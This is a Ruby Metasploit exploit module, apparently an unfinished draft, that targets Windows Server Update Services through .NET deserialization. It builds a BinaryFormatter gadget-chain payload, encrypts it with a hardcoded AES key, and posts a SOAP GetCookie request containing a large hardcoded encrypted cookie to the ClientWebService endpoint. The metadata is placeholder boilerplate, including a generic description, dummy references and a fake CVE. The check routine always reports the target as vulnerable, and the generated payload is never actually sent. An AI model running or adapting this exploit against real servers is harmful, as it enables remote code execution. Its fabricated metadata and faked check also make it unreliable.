##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking 

  include Exploit::Remote::HttpClient
  include Msf::Util::DotNetDeserialization

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Server Update Service Deserialization Remote Code Execution',
        'Description' => %q{
          This exploit module illustrates how a vulnerability could be exploited
          in an TCP server that has a parsing bug.
        },
        'License' => MSF_LICENSE,
        'Author' => ['skape'],
        'References' => [
          [ 'OSVDB', '12345' ],
          [ 'EDB', '12345' ],
          [ 'URL', 'http://www.example.com'],
          [ 'CVE', '1978-1234']
        ],
        'Arch' => ARCH_CMD,
        'Platform' => 'win',
        'Targets' => [
          [ 'Windows', {}]
        ],
        'DisclosureDate' => '2020-12-30',
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It's generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget' => 0,
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def nonzero_random_bytes(len)
    bytes = ''
    while bytes.bytesize < len
      c = OpenSSL::Random.random_bytes(1)
      bytes << c unless c == "\x00"
    end
    bytes
  end

  # partially borrowed from shiro_rememberme_v124_deserialize.rb
  def aes_encrypt(_payload)
    aes = OpenSSL::Cipher.new('aes-128-cbc')
    aes.encrypt
    aes.key = Rex::Text.decode_base64('h3wU5DNjgUWtIb0MFzkwcQ==')
    aes.iv = "\x00" * 16
    aes.padding = 0

    salt = nonzero_random_bytes(16)

    block_size = aes.block_size
    num = _payload.bytesize % block_size
    num2 = _payload.bytesize - num

    head = _payload.byteslice(0, num2).to_s

    tail_src = _payload.byteslice(num2, num).to_s
    padded_block = tail_src.ljust(block_size, "\x00")

    result = aes.update(salt)
    result << aes.update(head)
    result << aes.update(padded_block)
    result << aes.final

    result
  end

  def enc_payload
    dotnet_payload = ::Msf::Util::DotNetDeserialization.generate(
      payload.encoded,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter
    )
    puts(dotnet_payload)
    aes_encrypt(dotnet_payload)
  end

  def check
    CheckCode::Vulnerable
  end

  def exploit
    xml_payload = %Q(<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetCookie xmlns="http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService">
      <authCookies>
        <AuthorizationCookie>
          <PlugInId>SimpleTargeting</PlugInId>
          <CookieData>Lbn4XseONkfCbSVdIvi9Dhd7Y6c82NFX/aik1HDkpdv8ZATTn+lmqfGiKtMbqcwvxnA7zNMKz5dFMjIUaXRamxERSMKyjEqslCwLV7gmqXlQMZHR03LE+8pPBTNnDEKVJLNCKkvALzbT0gG/a4PCAcFJQol8Dd4xMhbtktfoSThyhE5khGvYmFzssVCfhwfFeRzn0xsBy14+8/pUOiaIfUKr/rYCj79taU2N9Wy6Y/dAFzbJCivb4+PQOO7OPTuX37X8EefI5Ih2rT+AK/gCFNGdYAkYdw4stRI3rchedo8zq93uMuZ/mrZhny2CgBYJ9qeaUjoaDTFWJcfiag+V8So+tQb/J44JFGjHqzFw8hcnBLaaWlTt3SdIy8tU2hsDb/6IFyjGjtnPSExTyWSpvjK2cfBm30MzKa1ePVTfyB49/MHFrnoovgT61vR42rsOccMBP84+y7OIu2iddoHvuvp1NMWASUHg8AADHjDk4Dzc8q3/E5oV2KiMEfc2zvNRMyPWFAYmxcNp6eBBNy/8+KKjZVSst2EqGMB3xPoaPl5gK8da3UmjK5jYuXsMuXsxkS0TvnXJqHwBRU44oJDRpqfTR+T4ep2GlYcga40ODIcGu9Dedqw23Ke4vvPzJmMh3ylKgCA/pXw4SJ3rECGyeNRqH9gp4+iFUKAbqcA6syWwHxN+hRcjZViyjD/Ikif4NHM7m693kznj5ZMc4BlMfxCUNFP63W3j+E6rDrb2qt6bzLKwRmvbAeUxvoPCkmB3BFJ5Xcy5iQ6nKP9SzJuJhW4RCuRKWUy5pU5sshmYQ4HF5DIYey66p7vu+3gq2rpIsRLCpzCdJiKWFzyndE/Tf0j4+8BweDOhvlEoQAEgEsDPeXve0oowzRRMI8aNFPAYo7i2Q+czG+2aQM19muvqeUeCt3pl15aE5m8gzdoY4JdwlROVKhjHN0FMle6flywH4MljjE6BXu4TC8BYeak2fkIJvMCr+SwdkwGUg/iSamA1WvKxin8OgXYVMnQTsYpk2Ozfo/mTaJbdMQ31znDxPEtLwp9cGc6y1SU0c1QWC8rYRmpsKrZi7LVd+7tns3LdZeSDEnaP0CL243BI2KQjV1ghGuE0LPp2WlaBXXxANW/HHm56I9strv03cEWauN6OPv9g2D+iIjeHj1XjbPfJxKn0rBuFSfLepjn2kRCl/6mReD7q2x4Sth7c28F8i5yz9X6fYt7rEROcBYVYnWEgxULDKAo3VhN3e4UKaQ/UuM72dXuaS/eRdyeO9Oe1/PP5ZktcQjQmebzxK/14WD50XQi3I1NQEW8q9J5CYBMHmSmAYddK6VRh5U0c34jUgb9kpFNrT0WElnAugM6VICeFQjUDPrXSe2LEMxVwPiPc9mIbSXS/IQHT+P0705bgwZgcWCu3mHUyoNXQHfjYwLiADhN+lXkuGalKvxQFcFAwzBh+jV3nIpNXqZEj3af/jjf+RlwkIGh/PesSn0hUZVm35AX7QMafIBalHT1BkPzJt8039VjbFC8xwP/fAuBw80rd4bwpSLwQHOgD2+QPdSzMS1MnYXRS8wlXwqpA18cSkyjpPb4C1IUJHGVS1gIjkdJQ5iJB4qR+8fihJIZciQNIWt0mW+Bq31B310e8pVwFXukDCa34F11T5qYUHzdGdzv8v61qS0V95qZTlT+8GHv+L9wm2ZIBRW39J6He5Q30jQ8ZDSpME3r97lpmprvyXKOSkClrHicVgxY6hNMgd0mIeJ+Px5fnRrwFECvD9y7FprTFnsOrpwE6vjoKQMh4XHewFtIDy1dXtmPRIRdDnJBFQSJgFrKbPmwK1edV4yR3a2GH1fnO3T1vzKMX/EhFBsvBcorx5LpsigXxPrwQxuWrDab8G+GZFg6iqKopUc7KM1sQX5JlPPGU6OG77S9OSooRNBFxB5ncCsAfFfttKara3fj+hzSN/QaLHxMtrk+tzjnQyE/sxFuc9kOBjyt5b+sQDuet2zPgcyBdjdK36+3qDNK+IoadQG7yWlV15O9eGXrCsW5NMOsRw0bojIso7KqmYL5J9tRVakjbgylhTJx91iWfwv4j+74Ez7Eo3Oxi3xMPwFM1vC2OGBg+nUkSFUbfrz+/2fJmyBViLa961QBzq1wHdWxJ0Sa+ThXtxAx4wPugMTBFWPab5PsjfcpmKSkbG1xXXXb7rKWQeFSOcPBSaTvECIoWaJFnhhXH0zn037QnxiZixUXH6XMNB70oiZqEtYvK+UgZLCPIYrk6x5Drxo455jOkurHupgEjHLN7yQ3F3Tpm/U9ukZVGaK9cTUivH49sbbc9CP/ePUwBjRHGakqp20b20nRKhGXnVnUcVsrD6JcVraEEkFHJ0sTgAnajyO5ulvPk04KL5IBqXwEY5/IJe8OSfnhyCKxIzxrD0Qa0mRQ/3Ho78Wg+TtAkGdlUPD9YH83wNCjX45h5+enM0FA0UtYNesQcQv7/JdwEkGPymk33iMcbyPnnlyV8HDutw2rQxbnDf9UCJitHAL7JvzzYO6QhLpcswKq1lsNtoJVaqdpiIbpC0X4ITxTY0YHhfGfRZkHasaQtaiygj7t5+yQP9ZDS2avMNC5oDeP+Z1XXcep+uqBaJpr9P8mevUC8t/pgDYEQOSfJfHgTkmidVmbXk1W7svWaBHNvbbkmyW3YJro6grv2Z3QmCy+hpYSYRXhZh6bECDEYBJTShhgGplZzKbEPfWS7kL//fP4SyHIBzKQgFgoRcRQjObykrMccPmwzyhsyJLMLagouB5BLTVev2bYYTrIljmxwfMDLDiyc3mvSuv0/HpTAIfLXM275eu/zmTlcLh3PzOcuoePMmU/wza1UZCTsXkHCCAd8jCTVfKow8zxWKrg0d0YvZtc2NlRR5vbITjJBd8TY2cSiF/loMsRFF7kRn3Y96am/uapd6TAwFD2E+cPD8bzhfesuFf5K6/EKWj20uYDAyduEP8/W1Du9PLZvowIIijZgHdc4YMAGDyHXlIDf5XqoBYzZtmRpM9tsTKFaCkTi5i3+tg==</CookieData>
        </AuthorizationCookie>
      </authCookies>
      <oldCookie xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
      <protocolVersion>1.20</protocolVersion>
    </GetCookie>
  </soap:Body>
</soap:Envelope>)

    send_request_cgi({
      'uri' => normalize_uri('ClientWebService', 'Client.asmx'),
      'method' => 'POST',
      'headers' => {"SOAPAction" =>"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"},
      'ctype' => 'text/xml',
      'data' => xml_payload
    })
  end
end
